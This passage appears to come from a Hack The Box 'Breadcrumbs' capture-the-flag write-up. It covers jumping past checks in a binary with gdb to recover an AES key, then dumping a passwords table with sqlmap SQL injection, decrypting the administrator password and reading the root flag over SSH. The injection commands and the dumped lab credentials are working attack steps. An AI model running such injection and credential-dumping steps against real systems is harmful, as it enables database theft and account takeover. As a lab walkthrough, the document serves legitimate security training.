   0x0000555555555404 <+445>:	pop    rbp
   0x0000555555555405 <+446>:	ret    
End of assembler dump.
```
We can see the if statements on ```0x00005555555552d0 <+137>:	cmp    DWORD PTR [rbp-0x14],0x641```, Let's breakpoint at this lines and run it:
```asm
gef➤  b *main+137
gef➤  b *main+155
gef➤  r 1
... file output...

gef➤  jump *main+150
gef➤  jump *main+161
Continuing at 0x5555555552e8.
Requesting decryption key from cloud...
Account: Administrator
[New Thread 0x7ffff6c6f700 (LWP 2706099)]
[Thread 0x7ffff6c6f700 (LWP 2706099) exited]
Server response:


selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
}

[Inferior 1 (process 2706090) exited normally]
```
And we can see the ```aes_key``` which is ```k19D193j.<19391(```.

As we can see from the code it make HTTP request to [http://passmanager.htb:1234/index.php](http://passmanager.htb:1234/index.php`) with ```method=select&username=administrator&table=passwords```.

The request body "translate" to something like ```select * from passwords where username=administrator```.

Let's try to use ```sqlmap``` against it as follow:
```console
┌─[evyatar@parrot]─[/hackthebox/Breadcrumbs]
└──╼ $ sqlmap -u 'http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords' -p username --dbs
...
[23:39:35] [INFO] fetching database names
available databases [2]:
[*] bread
[*] information_schema

```

And we get sql injection, Let's try to read ```bread``` table:
```console
┌─[evyatar@parrot]─[/hackthebox/Breadcrumbs]
└──╼ $ sqlmap -u 'http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords' -p username -D bread --tables
...
[23:43:29] [INFO] fetching tables for database: 'bread'
Database: bread
[1 table]
+-----------+
| passwords |
+-----------+

```
Let's dump this table:
```console
┌─[evyatar@parrot]─[/hackthebox/Breadcrumbs]
└──╼ $ sqlmap -u 'http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords' -p username -D bread --tables -T passwords --dump
...
[23:45:49] [WARNING] no clear password(s) found                                                             
Database: bread
Table: passwords
[1 entry]
+----+---------------+------------------+----------------------------------------------+
| id | account       | aes_key          | password                                     |
+----+---------------+------------------+----------------------------------------------+
| 1  | Administrator | k19D193j.<19391( | H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw= |
+----+---------------+------------------+----------------------------------------------+

```

So we have the AES key: ```k19D193j.<19391(``` (Which we already have from ```gdb```) and the cipher text (Base64): ```H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=```.

We can decrypt it [online](https://www.devglan.com/online-tools/aes-encryption-decryption):

![aesdecrypt.JPG](images/aesdecrypt.JPG)

And we get the Administrator password: ```p@ssw0rd!@#$9890./```.

Now, let's connect using ```ssh``` to get the root flag:
```console
┌─[evyatar@parrot]─[/hackthebox/Breadcrumbs]
└──╼ $ ssh administrator@10.10.10.228
administrator@10.10.10.228's password: 

Microsoft Windows [Version 10.0.19041.746]
(c) 2020 Microsoft Corporation. All rights reserved.

administrator@BREADCRUMBS C:\Users\Administrator>cd Desktop

administrator@BREADCRUMBS C:\Users\Administrator\Desktop>type root.txt
77d3e50413af3cefa5b5757cb0386997

```

And we get the root flag ```77d3e50413af3cefa5b5757cb0386997```.

![pwn.JPG](images/pwn.JPG)